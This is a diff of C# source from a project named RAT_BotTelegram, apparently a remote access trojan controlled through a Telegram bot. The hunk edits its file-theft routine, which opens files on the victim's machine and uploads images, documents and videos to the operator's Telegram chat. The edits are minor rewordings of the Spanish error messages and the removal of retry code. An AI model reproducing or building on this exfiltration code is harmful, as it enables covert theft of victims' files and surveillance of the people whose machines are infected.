@@ -239,42 +239,30 @@ namespace RAT_BotTelegram {
 
                         switch (GetFileType(file)) {
                             case "[Imagen]":
-
                                 if (infoFileZizePhoto(file)) {
                                     try {
                                         await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                     } catch {
                                         // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la foto, " + GetFileName(file));
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                     }
                                 } else {
                                     try {
                                         await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
                                     } catch {
                                         // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
                                     }
                                 }
                                 break;
                             case "[Video]":
                                 try {
-
-                                    //await Bot.SendVideoAsync(config.id, File.Open(@"F:\New folder (2)\40.3gp", FileMode.Open));//, 120, 2, 2, "info", ParseMode.Default, true, false);
-
                                     await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
                                 } catch (Exception e) {
                                     // Enviará el video pero por partes 10 Segundos x 10 segundos 
-                                    try {
+                                  
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
 
-                                        await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
-
-
-                                    } catch {
-                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file) + "\n\n, quizas se deba a que el archivo de video es mayora 50MB. [Se tratará de buscar una sólución en las proximas actualizaciones]");
-                                        Console.WriteLine("Hubo un error: \n" + e);
-                                    }
-
-                                    Console.WriteLine("Hubo un error: Principal\n" + e);
                                 }
                                 break;
                             case "[Audio]":
